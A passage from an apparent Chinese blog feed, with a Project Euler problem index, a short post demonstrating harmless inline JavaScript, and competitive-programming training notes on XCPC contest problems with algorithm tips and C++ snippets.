style="text-align:center"><a href="../../../../project-euler/0094">94</a></td><td style="text-align:center"><a href="../../../../project-euler/0194">194</a></td><td style="text-align:center"><a href="../../../../project-euler/0294">294</a></td><td style="text-align:center"><a href="../../../../project-euler/0394">394</a></td><td style="text-align:center"><a href="../../../../project-euler/0494">494</a></td><td style="text-align:center"><a href="../../../../project-euler/0594">594</a></td><td style="text-align:center"><a href="../../../../project-euler/0694">694</a></td><td style="text-align:center"><a href="../../../../project-euler/0794">794</a></td><td style="text-align:center"><a href="../../../../project-euler/0894">894</a></td><td style="text-align:center"><a href="../../../../project-euler/0994">994</a></td><td style="text-align:center"><a href="../../../../project-euler/1094">1094</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0095">95</a></td><td style="text-align:center"><a href="../../../../project-euler/0195">195</a></td><td style="text-align:center"><a href="../../../../project-euler/0295">295</a></td><td style="text-align:center"><a href="../../../../project-euler/0395">395</a></td><td style="text-align:center"><a href="../../../../project-euler/0495">495</a></td><td style="text-align:center"><a href="../../../../project-euler/0595">595</a></td><td style="text-align:center"><a href="../../../../project-euler/0695">695</a></td><td style="text-align:center"><a href="../../../../project-euler/0795">795</a></td><td style="text-align:center"><a href="../../../../project-euler/0895">895</a></td><td style="text-align:center"><a href="../../../../project-euler/0995">995</a></td><td style="text-align:center"><a href="../../../../project-euler/1095">1095</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0096">96</a></td><td style="text-align:center"><a href="../../../../project-euler/0196">196</a></td><td style="text-align:center"><a href="../../../../project-euler/0296">296</a></td><td style="text-align:center"><a href="../../../../project-euler/0396">396</a></td><td style="text-align:center"><a href="../../../../project-euler/0496">496</a></td><td style="text-align:center"><a href="../../../../project-euler/0596">596</a></td><td style="text-align:center"><a href="../../../../project-euler/0696">696</a></td><td style="text-align:center"><a href="../../../../project-euler/0796">796</a></td><td style="text-align:center"><a href="../../../../project-euler/0896">896</a></td><td style="text-align:center"><a href="../../../../project-euler/0996">996</a></td><td style="text-align:center"><a href="../../../../project-euler/1096">1096</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0097">97</a></td><td style="text-align:center"><a href="../../../../project-euler/0197">197</a></td><td style="text-align:center"><a href="../../../../project-euler/0297">297</a></td><td style="text-align:center"><a href="../../../../project-euler/0397">397</a></td><td style="text-align:center"><a href="../../../../project-euler/0497">497</a></td><td style="text-align:center"><a href="../../../../project-euler/0597">597</a></td><td style="text-align:center"><a href="../../../../project-euler/0697">697</a></td><td style="text-align:center"><a href="../../../../project-euler/0797">797</a></td><td style="text-align:center"><a href="../../../../project-euler/0897">897</a></td><td style="text-align:center"><a href="../../../../project-euler/0997">997</a></td><td style="text-align:center"><a href="../../../../project-euler/1097">1097</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0098">98</a></td><td style="text-align:center"><a href="../../../../project-euler/0198">198</a></td><td style="text-align:center"><a href="../../../../project-euler/0298">298</a></td><td style="text-align:center"><a href="../../../../project-euler/0398">398</a></td><td style="text-align:center"><a href="../../../../project-euler/0498">498</a></td><td style="text-align:center"><a href="../../../../project-euler/0598">598</a></td><td style="text-align:center"><a href="../../../../project-euler/0698">698</a></td><td style="text-align:center"><a href="../../../../project-euler/0798">798</a></td><td style="text-align:center"><a href="../../../../project-euler/0898">898</a></td><td style="text-align:center"><a href="../../../../project-euler/0998">998</a></td><td style="text-align:center"><a href="../../../../project-euler/1098">1098</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0099">99</a></td><td style="text-align:center"><a href="../../../../project-euler/0199">199</a></td><td style="text-align:center"><a href="../../../../project-euler/0299">299</a></td><td style="text-align:center"><a href="../../../../project-euler/0399">399</a></td><td style="text-align:center"><a href="../../../../project-euler/0499">499</a></td><td style="text-align:center"><a href="../../../../project-euler/0599">599</a></td><td style="text-align:center"><a href="../../../../project-euler/0699">699</a></td><td style="text-align:center"><a href="../../../../project-euler/0799">799</a></td><td style="text-align:center"><a href="../../../../project-euler/0899">899</a></td><td style="text-align:center"><a href="../../../../project-euler/0999">999</a></td><td style="text-align:center"><a href="../../../../project-euler/1099">1099</a></td></tr><tr><td style="text-align:center"><a href="../../../../project-euler/0100">100</a></td><td style="text-align:center"><a href="../../../../project-euler/0200">200</a></td><td style="text-align:center"><a href="../../../../project-euler/0300">300</a></td><td style="text-align:center"><a href="../../../../project-euler/0400">400</a></td><td style="text-align:center"><a href="../../../../project-euler/0500">500</a></td><td style="text-align:center"><a href="../../../../project-euler/0600">600</a></td><td style="text-align:center"><a href="../../../../project-euler/0700">700</a></td><td style="text-align:center"><a href="../../../../project-euler/0800">800</a></td><td style="text-align:center"><a href="../../../../project-euler/0900">900</a></td><td style="text-align:center"><a href="../../../../project-euler/1000">1000</a></td><td style="text-align:center"><a href="../../../../project-euler/1100">1100</a></td></tr></tbody></table><h1>隐藏题目(Bonus Problems)</h1><p>目前只有五道(20250210),是做题的时候随机掉落的,不固定掉落.<br>考虑到有人看不到Bonus题面,所以这里一并附上题面和翻译.</p><table><thead><tr><th style="text-align:center">A</th><th style="text-align:center">B</th><th style="text-align:center">C</th><th style="text-align:center">D</th><th style="text-align:center">E</th></tr></thead><tbody><tr><td style="text-align:center"><a href="../../../../project-euler/neg1">$-1$</a></td><td style="text-align:center"><a href="../../../../project-euler/sq13">$\sqrt{13}$</a></td><td style="text-align:center"><a href="../../../../project-euler/heeg">$\mathrm{Heegner}$</a></td><td style="text-align:center"><a href="../../../../project-euler/i018">$18i$</a></td><td style="text-align:center"><a href="../../../../project-euler/secr">$\mathrm{secret}$</a></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://projecteuler.net&quot;&gt;欧拉计划&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Warning&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;本题解含有大量AI生成内容(AI-Generated Code),如观感不适请立刻关闭页面!&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    <category term="GAME" scheme="https://narafluorine.github.io/categories/GAME/"/>
    
    
    <category term="Math" scheme="https://narafluorine.github.io/tags/Math/"/>
    
    <category term="Algorithm" scheme="https://narafluorine.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>JS-无限循环</title>
    <link href="https://narafluorine.github.io/2024/11/11/40000_%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF/"/>
    <id>https://narafluorine.github.io/2024/11/11/40000_%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF/</id>
    <published>2024-11-11T12:24:34.000Z</published>
    <updated>2025-10-29T04:43:03.428Z</updated>
    
    <content type="html"><![CDATA[<p>想使用js创建一系列展示技术力的页面,但是众所周知,一个网站又有看板娘,鼠标点击会有华丽特效,完了吧屏幕上还有点会被鼠标吸住,然后页面概述会在切换页面变一个,…,种种特效让博客很卡,实际浏览体验很差,所以Flu打算把这些华丽特效拆开放在不同的页面(谁不喜欢华丽呢?但是华丽的代价就是卡,只好被拆开)</p><p>不是更好的电脑买不起,而是把华丽的特效拆开更有性价比.</p><div><button οnclick="sayHello()">Click me</button></div><script>function sayHello() {alert('Hello from JavaScript');}</script><h1>这是Markdown标题</h1><p>以下是HTML内容：</p><div>  <h1 id="html-title">这是一个HTML标题</h1></div><style>  #html-title {    color: green;  }</style><script>  document.getElementById('html-title').style.fontSize = '4em';</script>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;想使用js创建一系列展示技术力的页面,但是众所周知,一个网站又有看板娘,鼠标点击会有华丽特效,完了吧屏幕上还有点会被鼠标吸住,然后页面概述会在切换页面变一个,…,种种特效让博客很卡,实际浏览体验很差,所以Flu打算把这些华丽特效拆开放在不同的页面(谁不喜欢华丽呢?但是华丽的</summary>
      
    
    
    
    <category term="OTH" scheme="https://narafluorine.github.io/categories/OTH/"/>
    
    
    <category term="JavaScript" scheme="https://narafluorine.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>XCPC 2025</title>
    <link href="https://narafluorine.github.io/2024/11/04/20006_XCPC_2025/"/>
    <id>https://narafluorine.github.io/2024/11/04/20006_XCPC_2025/</id>
    <published>2024-11-04T04:27:36.000Z</published>
    <updated>2025-10-15T09:07:42.685Z</updated>
    
    <content type="html"><![CDATA[<p>美好的新赛季从补题开始.</p><h1>pre</h1><ul><li>小心 $n$ 和 $m$ 写反.</li><li>注意数组不要开小或开大.</li><li>注意计算变量范围,不要能到 <code>long long</code> 的变量开 <code>int</code> .</li><li>感觉容易挂的地方写 <code>assert</code> .</li><li>感觉容易写挂的题,样例很弱的题一定要写对拍.</li><li>注意模数是不是质数.</li><li>注意操作的顺序.</li><li>认真读题,模拟完样例再写程序.</li><li><strong>注意清空数组</strong> .</li><li><strong>相信所有题都是可做的</strong> .</li><li>感觉不可做的,有较高多项式复杂度暴力的题,思考: <strong>分治</strong>,贪心,DP,线段树.</li><li>感觉不可做的,有指数级复杂度暴力的最优化题,思考: 贪心,DP,<strong>流和割</strong>,暴搜加优化.</li><li>感觉不可做的,有指数级暴力的数数题,思考: DP,行列式,暴搜加优化,拉格朗日插值,<strong>容斥</strong>,造自动机.</li><li>后遭,交互题,考虑: 增量法,分治,暴搜策略.</li><li>DP优化:凸优化(wqs),斜率优化,决策单调性,交换状态和值域,减少状态(包含常数上的).</li><li>感觉不可做的题,考虑各个元素,集合之间有什么关系.</li><li>就算过了样例,感觉没问题也要仔细分析一下各种情况,必要时对拍.</li><li>分段函数用vector,常数比map小很多.</li><li><strong>做题别急</strong> .</li><li>任何n较大的,可以快速算单项的东西考虑分段打表.</li><li>子区间问题有时可以类似最大子段和使用线段树维护,也有可能分治.</li></ul><p>Flu感觉很妙的idea才会被留下来,剩余的直接删掉,我这不是题解区.</p><h1><a href="https://qoj.ac/contest/1924?v=1">第一次集训</a></h1><p>Flu出ABC,队友1的G疯狂WA,2的H没开出来.</p><h2 id="K">K</h2><p>位运算炸int了: <code>Map|=(str[i]=='#')&lt;&lt;i</code> 前面半句话会转成int导致i在64左右的范围会直接挂掉.</p><h2 id="I">I</h2><p>题解非常妙,横着看很难,我们发现构造的排列对于一个位置,下一个位置是固定的,也就是说竖着一个除了末尾的字符串下一个出现的位置也是固定的,所以直接哈希检查即可,非常妙的题.</p><h1><a href="https://vjudge.net/contest/706236#overview">第二次集训</a></h1><p>概况:配合的不好,中间出现至少三次两个人开一个题的情况,<br>Flu开局开A,队友B开局也开A,结果这个题到最后都没过,疯狂WA,-6,爽!<br>Qiank出了俩签到,Flu出了一个签到,Qiank开字符串假了然后不想写了扔给我…<br>作为看过AveMujica的人(<s>赤石,豪赤多赤</s>),Flu当然是很快写过了,</p><p>榜单也很好看,开始的时候是倒数第三,剩半个小时的时候出现神之一手,两分钟过两个题,然后一跃正数第三,难绷.</p><h2 id="A">A</h2><p>给定两个罗盘的度数,计算方位角.<br>实际上边界会变,取平均数的时候注意一下(赛时没注意到就WA好多发,)</p><h2 id="C">C</h2><p>题意:你对城市建筑拍一张照,得到像素图,建筑可以被简化为一根柱子.<br>你每次可以询问一个像素点,返回该点是建筑还是天空(没东西),求最高建筑的位置和高度.(交互题,你要在 $12000$ 次询问内返回答案)</p><p>显而易见的结论是,对值域二分检查,nlogn绝对不够用.<br>然后mxx显然不会减小,对更高的值域二分,也显然不够用.<br>首先用一次检查mxx+1判断该楼会不会比当前更高,更高再二分.设想梯度图会被卡,还是不够用.</p><p>我们已经到算法优化的极限了,怎么办???<br>随机化查询坐标.(我人傻了,这也行???)</p><p>于是这个题就被乱搞草过去了…</p><h1><a href="https://vjudge.net/contest/707488#overview">第2.5次集训</a></h1><p>周六和周天是两场集训,正常情况下参加一场即可,Flu周天去要电协的QQ群所以没参加,这是后来补题的.</p><h2 id="F">F</h2><p>括号匹配,但是&lt;&lt;和&gt;&gt;能匹配,&gt;&gt;和&lt;&lt;也能匹配上,给一个这俩组成的序列,你要输出按照括号规则匹配的结果.</p><p>思路:我们强制最左端是 <code>[</code> 打头,不管他是&lt;&lt;还是&gt;&gt;,然后直接匹配即可.</p><h2 id="D">D</h2><p>难点在于给一个数n,你要把它分组,每组可以为0,组之间有顺序,而且你分的组要单调不增,你要O(1)算这个值.</p><p>答案:爆典…<br>其实和n分成任意组(非0),每组不大于m的dp状态是一样的,难点在于证明.</p><p>你竖着想,5可以分成3和2,这是两根柱子.</p><p>然而你横着想,因为单调不增所以你的柱子都是从左打头从右结尾的,而且宽度上限就是m,得证.</p><p>于是Flu会算法还是没做出来,输!</p><h2 id="A-2">A</h2><p>给一个函数 $f((l,r))=(\min(a_{l-r}),\max(a_{l-r}))$ ,q次询问每次lr问最少几次可以让 $f(f(f(f(…f((l,r))))))$ 取到 $(1,n)$ .</p><p>div1的E…有点不敢做.</p><h1><a href="https://codeforces.com/gym/105578">ICPC2024沈阳站</a></h1><h2 id="J">J</h2><p>草,前四个最大值和后四个最大值比较,写的时候犯唐把队名和战力全用string存,结果真的能过样例,(int比较炸了)</p><h2 id="B">B</h2><p>构造两个数列满足 $a_ib_j\mod nm$ 不重.<br>大胆猜,nm不互质无解,然后尝试从nm出发,在n这里构造1+km%nm,在m这里构造1+kn%nm.</p><h2 id="D-2">D</h2><p>先来一个结论:交换两个元素对一个排列的逆序对奇偶性的变化取决于区间差,排列的整体左移右移多少次可以转换为区间上的很多次交换,所以逆序对奇偶性变化可以O(1)算出来.</p><p>所以,给的其实是一个排列,然后交换AB实际上是假的,对哪交换都可以,只需要算出开始的逆序对奇偶性就行了,而且因为刚开始只需要计算奇偶性,甚至能O(n)算出来.</p><h2 id="E">E</h2><p>不会写状压dp了…</p><p>温习一下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dp[<span class="number">1</span>&lt;&lt;<span class="number">16</span>][<span class="number">16</span>]<span class="comment">//状态为i,结尾为j时最小</span></span><br><span class="line"><span class="keyword">for</span> 枚举状态  </span><br><span class="line"><span class="keyword">for</span> 枚举上一个结尾点</span><br><span class="line"><span class="keyword">for</span> 枚举新加进去的二进制状态</span><br></pre></td></tr></table></figure><h2 id="G">G</h2><p>给n个点,这些点组成一个简单多边形,你最多询问n次,每次返回多边形在 $x=i$ 处的切片长度,你要回答多边形面积.</p><p>很神秘的题.你要计算 $\int_{-1000}^{1000}f(x)\mathrm dx$ 的值,每次询问回答一个点的 $f(x)$ .<br>有一个性质:这个面积函数在x轴两点之间是线性变化的,于是考虑询问端点.具体地:<br>坐标都不相同:f(x)分了(n-1)段,询问分段点即可(两端是0).<br>有相同的:f(x)分了(n-2)段,询问最左最右两个端点,然后对分段区询问中点.</p><p>然而题目返回的是 <code>p/q</code> 的形式, pq 可能很大,使用longdouble最后向0.5取整(发现题目都是整数点,所以答案只可能是 <code>x.0</code> 或 <code>x.5</code> ).</p><h2 id=""></h2><h1><a href="https://pintia.cn/problem-sets/994805046380707840/exam/problems/type/7">天梯赛2025</a></h1><p>拒绝写解题报告,语文太烂了读不懂题.</p><h1><a href="https://vjudge.net/contest/708329">第三次集训</a></h1><p>全是思维题.(中间试着打了一下CTF的Warm,感觉很好玩)<br>Flu被队友带飞了,一个题也没做出来…</p><h2 id="A-3">A</h2><p>有一个nm矩阵,部分格子有障碍物(*)否则为空,你要对空格子用[0,k]种颜色涂色,其中[1,k]种颜色同行同列只能出现一次,0颜色可以无限使用,设你用了z个0,代价是 $ck+dz$ ,cd是给定常数,求最小花费.</p><p>题解说是网络流,然而还有一种办法可过.</p><h2 id="H">H</h2><h2 id="E-2">E</h2><p>有一个n节点的环,你每次可以选任意[1,m]个连续节点涂成黑色,对面也要这么做,不能涂色的人输,现在nm多组询问,对每次询问输出谁赢.</p><blockquote><p>先手第一步除非可以直接赢,否则环会被拆成链.然后后手除非m是1否则必然可以把链断成完全相同的两部分,然后后手只需要模仿先手就一定会赢.</p></blockquote><h2 id="G-2">G</h2><p>给n个不覆盖的矩形,你要找出所有的对称轴.注意:假如正方形可能由一个长条+两个小正方形组成,这个正方形依旧有4条对称轴.</p><p>观察发现对称轴必须经过一个点,而且最多有四个,只要能够 $O(n\log n)$ 检查就已经赢了.由于矩形可能是拼起来的,所以常规记录线的方法不可行,要考虑用点记录矩形.</p><p>结论:被偶数个矩形覆盖的点无效(矩形覆盖是仅限边界四个点的),如图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-+      +-x-+</span><br><span class="line">| |      | | |</span><br><span class="line">x-+-+    x-x-x</span><br><span class="line">|   |    |   |</span><br><span class="line">+---+    +---+</span><br></pre></td></tr></table></figure><p>然后直接翻转检查点即可.<br>但是不出意外的话是要出意外了,点绕直线对称的结论是啥来着?$$Ax+By+C=0\\ x’=x_0-2A\frac{Ax_0+By_0+C}{A^2+B^2}\\ y’=y_0-2B\frac{Ax_0+By_0+C}{A^2+B^2}$$</p><h1><a href="https://vjudge.net/contest/708404">第四次集训</a></h1><p>和银趴(Linux <strong>in</strong>stall <strong>par</strong>ty)撞了(悲).<br>全场唐完,刚开始是队友1的D见祖宗了,然后是队友1的G数组开小了(开1e5题干2e5),然后Flu的H结论对了但是不敢写(诈骗)一度悬置这个题.然后队友2的B疯狂WA,然后屡了一下思路之后过了.</p><p>G:单调栈题,没做出来,后来发现是弹&quot;时间差&quot;个元素即可.<br>A:empty中场来到我这说, <code>0011</code> 就是 <code>gugugaga</code> (捣乱来了)…</p><h2 id="A-4">A</h2><p>括号树…是啥?</p><p>首先把0011转换为括号匹配,可知合法不合法.然后建括号树进行拓扑序计数即可.<br>括号树:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">((())())</span><br><span class="line">   / \</span><br><span class="line">(())  ()</span><br><span class="line">  |</span><br><span class="line"> ()</span><br></pre></td></tr></table></figure><p>以某个点为根的树拓扑序(子节点一定要出现在根节点前面)的个数:$$n!\left(\prod_{i=1}^nsz_i\right)^{-1}$$$sz_i$ 表示以 $i$ 节点为根的子树大小.</p><p>看别人的码才发现,逆元有一个 $O(n)$ 的递推方式,之前一直用的快速幂 $O(n\log n)$ 算逆元,常数大的不行.</p><h2 id="E-3">E</h2><p>给一张图代表城市,城市会被水淹,求从1点出发淹没所有城市的最小水高度.</p><p>Flu原先想的是,一个城市被淹的时候走的都是最短路,所以直接对每个城市的边权取min然后对所有城市的min取max就行了,然而不对,比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line">4/ \5</span><br><span class="line">2---3</span><br><span class="line">  1</span><br></pre></td></tr></table></figure><p>这种情况最小边权是4,因为淹没了2之后淹没3是顺手的事.</p><p>所以正解是最小生成树.(最小生成树咋求来着?排序边,并查集…)</p><p>然后是网络流,有一个定理:</p><blockquote><p>最大流==最小割</p></blockquote><h2 id="C-2">C</h2><p>有一个问题: <strong>哈密顿路</strong> 和 <strong>哈密顿回路</strong> 不是一个东西.前者只需要遍历就可以了,后者则需要状压DP.</p><p>然而…<br>树上进行链的合并要动态维护sz,同时由于dp值会发生变化,要开一个辅助数组临时存放,然后在一整个链合并完之后在集中推平,草,合并链都不会写,这么唐吗…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> pos)</span></span>&#123;</span><br><span class="line">sz[pos]=<span class="number">1</span>;dp[pos][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> v:edge[pos])&#123;</span><br><span class="line"><span class="built_in">dfs</span>(v);</span><br><span class="line"><span class="built_in">fill</span>(tmp,tmp+<span class="number">400</span>,<span class="number">-1145141919810</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=sz[pos];++i)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=sz[v];++j)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;=<span class="built_in">min</span>(i+j<span class="number">-1</span>,<span class="number">2</span>*<span class="built_in">min</span>(i,j));++k)&#123;</span><br><span class="line">tmp[i+j-k]=<span class="built_in">max</span>(tmp[i+j-k],k*num[pos]+dp[pos][i]+dp[v][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> _=<span class="number">1</span>;_&lt;=sz[pos]+sz[v];++_)&#123;</span><br><span class="line">dp[pos][_]=tmp[_];</span><br><span class="line">&#125;</span><br><span class="line">sz[pos]+=sz[v];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><a href="https://vjudge.net/contest/714948">第五次集训</a></h1><p>决定省赛谁打星的关键比赛,Flu队直接拿第一出线了(empty佬的恩情还不完…),第二次可以不参与了.</p><h2 id="B-2">B</h2><p>设 $f(x)$ 是一个数分解成质数的最小个数.<br>对于偶数,使用哥德巴赫猜想(除了2),必定能够拆成两个奇质数.<br>对于奇数,首先是拆成2和f(奇数-2),然而还可以拆成三个奇质数的和(偶数+奇质数,又是猜想),所以上界是3.</p><h1><a href="https://codeforces.com/gym/103486">VP</a></h1><p>回想起来了括号匹配结论是卡特兰数.</p><h2 id="I-Nim-Game">I Nim Game</h2><p>读假题了…题干要求的是对区间加,然后区间判断nim能不能玩.</p><p>nim能不能玩是用线性基,然后区间加可以用树状数组差分解决.</p><h2 id="C-Random-Number-Generator">C Random Number Generator</h2><p>BSGS…<br>Flu学数学还没看出来这个,真成战犯了…</p><p>回顾BSGS和二次剩余的区别:分别让求$$a^x\equiv b\mod p$$$$x^2\equiv a\mod p$$这俩不一样…</p><h2 id="-2"></h2><h1><a href="https://codeforces.com/gym/105922">吉林省赛</a></h1><blockquote><p>Flu:省赛铜直接退役.</p></blockquote><p>失误:开局QianK一直在开签到,签麻了.<br>失误:Flu线段树用mod当根,取模的时候炸了(我错了我错了).</p><h2 id="C-3">C</h2><p>如何计算巨运算符,如$$pow=\sum_{x_1=0}^{n-1}\sum_{x_2=0}^{n-1}\sum_{x_3=0}^{n-1}a_{(x_1+x_2+…+x_n)\mod n}$$最后发现最后一个就是sum数列或者prod数列,然后考虑向前处理:<br>碰到sum说明有n个这样的数列,所以乘n即可.<br>碰到prod要对其求n次方.</p><h2 id="H-2">H</h2><p>两段区间上要支持区间加上某个数字,你要判断两段区间可以任意交换顺序后是否相等.</p><p>哈希.但是要考虑怎么哈希,赛时想到的方法有:</p><ol><li>维护区间所有和的二次方和.(以及其加强版,维护三次方和(初始时再加一个随机偏移))</li><li>选一个数做底,维护其a次方的和.</li><li>维护区间所有数的抑或和.</li></ol><p>事实上,方法1很容易被卡,加强版过了这个题.<br>方法2好写好调,为什么不写?<br>其实做法3假了,因为区间加和不是区间抑或,所以是没法维护的…</p><p>两段区间是分奇偶的,如何维护?<br>考虑把奇数做成正的,偶数做成负的,判断其加和是否为0即可(所以只需要一颗线段树).</p><h2 id="OTH">OTH,</h2><p>群U说可以直接把交互逻辑写进程序,然后留个开关即可.</p><h1><a href="https://codeforces.com/gym/105924">东北赛</a></h1><blockquote><p>死磕BH失败,铜了…<br>成就:三色牌…(省赛金,东北赛银,全国邀请赛铜…)</p></blockquote><p>失误:死磕.<br>修正:多看题,在写代码之前禁止交流解法,防止被带偏.</p><h1>杂题随机做</h1><p>后面因为期末考试外加各种比赛的原因,根本补不完题,扔最后了…</p><h2 id="CF2043E"><a href="https://codeforces.com/problemset/problem/2043/E">CF2043E</a></h2><p>你有两个矩阵AB,每次能对一行&amp;一个数,也可以对一列|一个数,问最终A能否转换为B.</p><p>正着想把A转成B很难,就倒过来想: <code>&amp;</code> 就是把一列0转换为通配符, <code>|</code> 就是把一行1转换为通配符,然后加到队列里宽搜一下,最后模糊匹配一下答案就出来了.</p><h2 id="gym103428F"><a href="https://codeforces.com/gym/103428/problem/F">gym103428F</a></h2><p>非常好的题.有n堆石子,两个人博弈,每次要拿前面拿的石子数的因数倍,且任选几个大于等于你要拿的数量的石堆拿走这么多石子,问保证你赢的情况下,你有多少种初始拿法?</p><p>首先考虑1的情况,此时必胜当且仅当石堆中存在一个奇数堆,这样的话你把所有奇数堆变成偶数堆,然后 <strong>模仿</strong> 对面怎么拿,你是必赢的.<br>然后考虑不存在奇数堆的情况,全是偶数堆的话用1去拿显然是必输的,因为会被模仿.所以偶数堆直接全部除2直到出现奇数,此时问题变成前面一种情况.<br>答案就是(最小奇数+1)/2.</p><h2 id="洛谷4446">洛谷4446</h2><blockquote><p>把 $x^{1/4}$ 以内的质数全部除掉,剩下的一定是一个立方数或不可开方数.</p></blockquote><p>然后预处理 $x^{1/4}$ 以内的质数,同时处理 $x^{1/3}$ 以内的立方数,就可以对最后二分判定是不是立方数.</p><h2 id="ARC150D"><a href="https://www.luogu.com.cn/problem/AT_arc150_d">ARC150D</a></h2><p>设E(Xi)为i点期望被选中的次数，那么 $ans=∑_{i=1}^n​E(X_i​)$ 。<br>设i点的深度为di。<br>如果一次操作选中了除1到i路径以外的的点，那么对i没有影响，所以只需要考虑选1到i路径上的点的情况。</p><p>允许选中好点，但不算选中好点的贡献，这和原问题是等价的。</p><p>所以问题可以转化为，di个点，每次等概率抽取一个点，抽到第di个点时贡献加1，一直抽直到所有点都被抽到过。</p><p>假设已经被抽到过的点有k个，那么再抽一次抽到未被抽到的点的概率为 $\frac{d_i-k}{d_i}$ ，期望 $\frac{d_i}{d_i-k}$ 抽到下一个未被抽到的点（做某件事情成功的概率为p，期望做 $\frac1p$ 次成功）。</p><p>所以把所有点都抽到的期望次数为 $\sum_{k=0}^{d_i-1}\frac{d_i}{d_i-k}=d_i\sum_{k=1}^{d_i}\frac1k$ ，每次抽到第di个点的概率都是 $\frac1{d_i}$ ，所以第di个点期望被抽到 $\sum_{k=1}^{d_i}\frac1k$ ,</p><p>所以 $ans=\sum_{i=1}^n\sum_{j=1}^{d_i}\frac1j$ .</p><blockquote><p>连带:一个n面色子,问期望多少次能把所有面都投出来.<br>设f(i)表示当前n面色子,投出来了i种颜色.<br>$f(i+1)=f(i)+\frac{n}{n-i}=n\sum_{i=1}^n\frac 1i$</p></blockquote><h2 id="cf1446c"><a href="https://codeforces.com/problemset/problem/1446/C">cf1446c</a></h2><p>给你一堆数,每个数字会找与这个数字抑或和最小的数字连边,最后会形成一张图,你要删掉最少的点使图联通,求最少删几个点.</p><p>首先删点很复杂,我们转化为保留最多的点.<br>显然最后剩下的一定是一棵树,而且只有一对是互相是xor的最小值.</p><p>联想trie树,树上的相邻节点之间满足xor最小(因为前面都一样,后面自然最小),所以建一个字典树维护01.</p><p>如果只有左右儿子,直接返回即可.如果都有,那么根据最长往外延展1个的原理,是max(l,r)+1.<br>直接合并即可.</p><h2 id="CF1778F"><a href="https://codeforces.com/problemset/problem/1778/F">CF1778F</a></h2><p>给你一棵树,树上有点权,每次你可以让一个整个子树乘上子树的gcd(最多做k次操作),问你根节点的值最后最大是多少.</p><p>首先,假如没有k的限制,直接拓扑排序即可.<br>假如没有呢…首先维护子树gcd和所有数的ceilsqrt().<br>ceilsqrt:对于x有最小的c满足c^2是x的倍数.具体地,对x分解质因数之后所有p的次方取 $\lceil \frac i2\rceil$ 最后乘一起就可以了.</p><p>首先,最后答案一定是根乘上根的一个因子.</p><p>其次,因为维护哪里要乘哪里不乘很不方便,所以我们转化为一个判断性问题:<br>对于根节点,倒序枚举所有因子,判断假如说子树要变成这样最少要多少次,然后再比较,就可以很轻松得到答案.<br>所以写一个dfs(num,ko,val):<br>如果子树gcd是val因子,直接返回.<br>否则如果子树gcd的平方是val因子,那么需要对子树进行一次gcd操作,返回.<br>否则如果子树根节点的平方还不是val因子,或者这是个叶节点,那么无法完成操作.<br>然后要对子树进行操作:先操作子树,然后再操作根节点,对于每个子树w要把gcd(w)变成ceilsqrt(d)的倍数,这样就可以把根节点gcd^2(w)是d的倍数,否则完不成操作.<br>dfs传参即可.</p><h2 id="CF1841C"><a href="https://codeforces.com/problemset/problem/1841/C">CF1841C</a></h2><p>给你一个字符串,你最多能更改一位,求最大值.<br>字符串只有ABCDE五种字母,分值分别是1,10,100,1000,10000,一个字母贡献是正的当且仅当右边不存在严格比他字典序大的字母,如ABCDE的贡献是 $-1-10-100-1000+10000$ .</p><p>本来我认为是直接枚举每位是ABCDE,然后只要能O(1)算贡献就完事了,所以pre表示前缀最大,然后倒着枚举,这么着后半段是算出来的,前半段是枚举的,但是这么着会假,比如 <code>AExxxxxxxxx</code> 在枚举E后面的时候AE只会被单纯统计起来,没有大小关系,就会WA,想改正又很难写.</p><p>正确做法是贪心,一个字符想改有两种情况:改大:最左侧的是最优的,能带来最少的负字符.改小:最右侧是最优的,因为有更大的概率是正贡献.所以对10个位置暴力改成其他字符,然后检查即可.</p><h2 